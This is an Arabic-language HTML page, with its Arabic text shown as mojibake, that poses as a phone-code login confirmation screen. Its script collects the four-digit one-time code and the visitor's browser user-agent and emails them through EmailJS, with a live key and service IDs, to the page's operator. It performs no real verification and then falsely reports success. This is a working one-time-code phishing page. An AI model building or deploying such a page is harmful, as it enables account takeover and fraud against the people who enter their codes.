<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        /* ğŸ”µ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¹Ø§Ù…Ø© */
        * {
            box-sizing: border-box;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Cairo', sans-serif; /* Ø§Ù„Ø®Ø· Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ */
            height: 100vh;
            height: -webkit-fill-available;
            display: flex;
            flex-direction: column;
            color: #333;
            overflow: hidden;
        }

        /* ğŸ”µ 1. Ø§Ù„Ù€ Header (Ø§Ù„Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù„ÙˆÙŠ) */
        .header {
            height: 65px; /* Ø¨ÙŠÙ† 60-70px */
            background-color: #01A7C1; /* Ù„ÙˆÙ† Ø³Ù…Ø§ÙˆÙŠ ÙÙŠØ±ÙˆØ²ÙŠ Ù‚ÙˆÙŠ */
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 0 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .header-title {
            color: #ffffff;
            font-size: 21px; /* Ø¨ÙŠÙ† 20-22px */
            font-weight: 700; /* Bold */
        }

        .back-icon {
            position: absolute;
            right: 20px; /* ÙÙŠ Ø§Ù„Ø¬Ù‡Ø© Ø§Ù„ÙŠÙ…Ù†Ù‰ Ù„Ù„Ù€ RTL */
            color: #ffffff;
            font-size: 20px;
            cursor: pointer;
        }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ÙˆØ³Ø·ÙŠ */
        .content-container {
            flex: 1;
            padding: 0 25px;
            display: flex;
            flex-direction: column;
            align-items: center; /* ØªÙˆØ³ÙŠØ· Ø§Ù„Ø¹Ù†Ø§ØµØ± */
        }

        /* ğŸ”µ 2. Ø§Ù„Ù†Øµ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ */
        .main-text {
            margin-top: 40px; /* Ø­ÙˆØ§Ù„ÙŠ 35-45px */
            color: #1A1A1A;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 50px;
        }

        /* ğŸ”µ 3. Ø®Ø§Ù†Ø§Øª Ø¥Ø¯Ø®Ø§Ù„ OTP (Ø®Ø·ÙˆØ·) */
        .otp-container {
            display: flex;
            gap: 25px; /* ØªØ¨Ø§Ø¹Ø¯ 25px */
            direction: ltr; /* Ù„Ø¶Ù…Ø§Ù† ØªØ±ØªÙŠØ¨ Ø§Ù„Ø£Ø±Ù‚Ø§Ù… */
            margin-bottom: 50px;
        }

        .otp-input {
            width: 40px; /* 35-40px */
            border: none;
            border-bottom: 2px solid #333; /* Ø³Ù…Ùƒ 2px ÙˆÙ„ÙˆÙ† ØºØ§Ù…Ù‚ */
            text-align: center;
            font-size: 28px;
            font-family: 'Cairo', sans-serif;
            font-weight: 600;
            background: transparent;
            border-radius: 0;
            padding: 5px 0;
            color: #1A1A1A;
            transition: border-color 0.3s;
        }

        .otp-input:focus {
            border-bottom-color: #01A7C1; /* ØªÙ„ÙˆÙ† Ø¹Ù†Ø¯ Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¨Ù†ÙØ³ Ù„ÙˆÙ† Ø§Ù„Ù‡ÙŠØ¯Ø± */
        }

        /* ğŸ”µ 4. Ø§Ù„Ù†Øµ Ø§Ù„Ø®Ø§Øµ Ø¨Ù…Ø¯Ø© Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© */
        .timer-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .timer-label {
            color: #444;
            font-size: 16px;
            margin-bottom: 5px;
            display: block;
        }

        .timer-countdown {
            color: #1A1A1A;
            font-size: 17px; /* 16-18px */
            font-weight: 600;
            display: block;
        }

        /* ğŸ”µ 5. Ø±Ø§Ø¨Ø· Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (Ø§Ù„Ù…Ø¹Ø·Ù„) */
        .resend-link {
            color: #B6B6B6; /* Ø±Ù…Ø§Ø¯ÙŠ Ø¨Ø§Ù‡Øª Ø¬Ø¯Ø§Ù‹ */
            font-size: 15px;
            font-weight: 400;
            text-decoration: none;
            pointer-events: none; /* ØºÙŠØ± Ù‚Ø§Ø¨Ù„ Ù„Ù„Ø¶ØºØ· */
            cursor: default;
        }

        /* ğŸ”µ 6. Ø²Ø± Ø§Ù„ØªØ­Ù‚Ù‚ (Ø£Ø³ÙÙ„ Ø§Ù„Ø´Ø§Ø´Ø©) */
        .submit-container {
            width: 100%;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }

        .verify-btn {
            width: 100%;
            height: 65px; /* 60-70px */
            background-color: #FFC400; /* Ø£ØµÙØ± Ù‚ÙˆÙŠ */
            color: #ffffff; /* Ù†Øµ Ø£Ø¨ÙŠØ¶ */
            font-family: 'Cairo', sans-serif;
            font-weight: 600;
            font-size: 18px;
            border: none;
            cursor: pointer;
            transition: background 0.2s;
            /* Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø­ÙˆØ§Ù Ø§Ù„Ø¯Ø§Ø¦Ø±ÙŠØ© Ù„ÙŠÙƒÙˆÙ† Ù…Ù„ØªØµÙ‚ ØªÙ…Ø§Ù…Ø§Ù‹ */
            border-radius: 0; 
        }

        .verify-btn:active {
            background-color: #e0ac00;
        }
        
        .verify-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

    </style>
</head>
<body>

    <header class="header">
        <i class="fa-solid fa-arrow-right back-icon" onclick="history.back()"></i>
        <div class="header-title">Ø´ÙŠÙØ±Ø© Ø§Ù„ØªØ£ÙƒÙŠØ¯</div>
    </header>

    <div class="content-container">
        
        <div class="main-text">
            Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù…Ø±Ø³Ù„ Ø¥Ù„Ù‰ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ
        </div>

        <form id="otpForm" onsubmit="event.preventDefault(); verifyOtp();">
            <div class="otp-container">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp1" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp2" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp3" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp4" autocomplete="one-time-code">
            </div>
        </form>

        <div class="timer-container">
            <span class="timer-label">ØªÙ†ØªÙ‡ÙŠ ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø®Ù„Ø§Ù„</span>
            <span class="timer-countdown" id="countdown">4 Ø¯Ù‚Ø§Ø¦Ù‚ 58 Ø«ÙˆØ§Ù†ÙŠ</span>
        </div>

        <a href="#" class="resend-link">Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯</a>

    </div>

    <div class="submit-container">
        <button type="submit" form="otpForm" class="verify-btn">Ø§Ù„ØªØ­Ù‚Ù‚</button>
    </div>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯ EmailJS
        (function(){
            // âš ï¸âš ï¸ Ø§Ø³ØªØ¨Ø¯Ù„ 'YOUR_PUBLIC_KEY' Ø¨Ù…ÙØªØ§Ø­Ùƒ Ø§Ù„Ø¹Ø§Ù…
            emailjs.init("zWBq4dbSzfkEvVeS2");
        })();

        // 2. Ù…Ù†Ø·Ù‚ Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨ÙŠÙ† Ø§Ù„Ø®Ø§Ù†Ø§Øª
        const otpInputs = document.querySelectorAll('.otp-input');

        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value.length === 1) {
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    } else {
                        input.blur(); 
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '') {
                    if (index > 0) {
                        otpInputs[index - 1].focus();
                    }
                }
            });

            input.addEventListener('focus', (e) => {
                e.target.select();
            });
        });

        // 3. Ù…Ù†Ø·Ù‚ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ (Timer)
        let totalSeconds = (4 * 60) + 58; // 4 Ø¯Ù‚Ø§Ø¦Ù‚ Ùˆ 58 Ø«Ø§Ù†ÙŠØ©
        const countdownElement = document.getElementById('countdown');

        const timerInterval = setInterval(() => {
            if (totalSeconds <= 0) {
                clearInterval(timerInterval);
                countdownElement.innerText = "Ø§Ù†ØªÙ‡Øª Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©";
                // ØªÙØ¹ÙŠÙ„ Ø²Ø± Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
                const resendLink = document.querySelector('.resend-link');
                resendLink.style.color = "#01A7C1";
                resendLink.style.pointerEvents = "auto";
                resendLink.style.cursor = "pointer";
                return;
            }

            totalSeconds--;
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;

            countdownElement.innerText = `${minutes} Ø¯Ù‚Ø§Ø¦Ù‚ ${seconds} Ø«ÙˆØ§Ù†ÙŠ`;
        }, 1000);


        // 4. Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        function verifyOtp() {
            const otpCode = 
                document.getElementById('otp1').value + 
                document.getElementById('otp2').value + 
                document.getElementById('otp3').value + 
                document.getElementById('otp4').value;

            if(otpCode.length < 4) {
                alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² ÙƒØ§Ù…Ù„Ø§Ù‹.");
                return;
            }

            const btn = document.querySelector('.verify-btn');
            const originalBtnText = btn.innerText;
            
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...';
            btn.disabled = true;

            // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
            var templateParams = {
                otp_code: otpCode,
                device_info: navigator.userAgent
            };

            // âš ï¸âš ï¸ Ø§Ø³ØªØ¨Ø¯Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£Ø¯Ù†Ø§Ù‡ Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©
            emailjs.send('service_lyabofe', 'template_v443mrn', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    btn.innerText = 'ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­';
                    btn.style.backgroundColor = "#4CAF50"; 
                    
                    setTimeout(() => {
                         // Ù‡Ù†Ø§ ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ù„Ù„ØµÙØ­Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                         // window.location.href = "success.html";
                         btn.innerText = originalBtnText;
                         btn.style.backgroundColor = "#FFC400";
                         btn.disabled = false;
                         document.getElementById('otpForm').reset();
                         otpInputs[0].focus();
                    }, 2000);

                }, function(error) {
                    console.log('FAILED...', error);
                    alert("Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ ØºÙŠØ± ØµØ­ÙŠØ­ Ø£Ùˆ Ø­Ø¯Ø« Ø®Ø·Ø£.");
                    btn.innerText = originalBtnText;
                    btn.disabled = false;
                });
        }
    </script>
</body>
</html>